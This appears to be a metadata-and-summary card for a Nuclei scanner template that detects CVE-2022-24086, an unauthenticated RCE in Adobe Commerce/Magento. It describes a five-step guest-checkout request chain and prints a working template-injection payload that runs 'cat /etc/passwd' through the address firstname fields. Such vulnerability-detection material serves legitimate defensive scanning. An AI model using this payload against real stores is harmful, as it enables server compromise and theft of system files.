---
cve_id: CVE-2022-24086
template_path: nuclei-templates/http/cves/2022/CVE-2022-24086.yaml
affected_product: Adobe Commerce (Magento)
severity: critical
authentication: none
external_callback: false
affected_versions: 2.4.3-p1 (and earlier) and 2.3.7-p2 (and earlier)
preconditions: guest checkout enabled
poc_classification: rce
---

## Vulnerability
Adobe Commerce versions 2.4.3-p1 (and earlier) and 2.3.7-p2 (and earlier) are affected by an improper input validation vulnerability during the checkout process. Exploitation does not require user interaction and could result in arbitrary code execution.

## PoC / Detection
Classification: rce

The template automates a 5-step guest-checkout flow to trigger and confirm RCE:

- GET `{{BaseURL}}` to confirm Magento presence (X-Magento-Tags + form_key) and extract `form_key`.
- POST to `/checkout/cart/add/.../product/{{product_id}}` to populate the cart (using extracted `form_key`).
- GET `/checkout` to extract guest-cart `entity_id`.
- POST to `/rest/default/V1/guest-carts/{{entity_id}}/shipping-information` with RCE payload `{{var this.getTemplateFilter().filter(foobar)}}{{var this.getTemplateFilter().addAfterFilterCallback(system).filter(cat$IFS/etc/passwd)}}` injected into `firstname` of both shipping and billing addresses (flatrate method).
- POST to `/rest/default/V1/guest-carts/{{entity_id}}/payment-information` with identical payload in billing address.

Success is verified by regex match for `root:.*:0:0:` (output of injected `cat /etc/passwd`) in the final 200 OK response body.

## References
- https://helpx.adobe.com/security/products/magento/apsb22-12.html
- https://vovohelo.medium.com/reversing-a-magento-rce-cve-2022-24086-e991ead4d8af
- https://labs.watchtowr.com/adobe-commerce-magento-rce-cve-2022-24086/
- https://nvd.nist.gov/vuln/detail/CVE-2022-24086
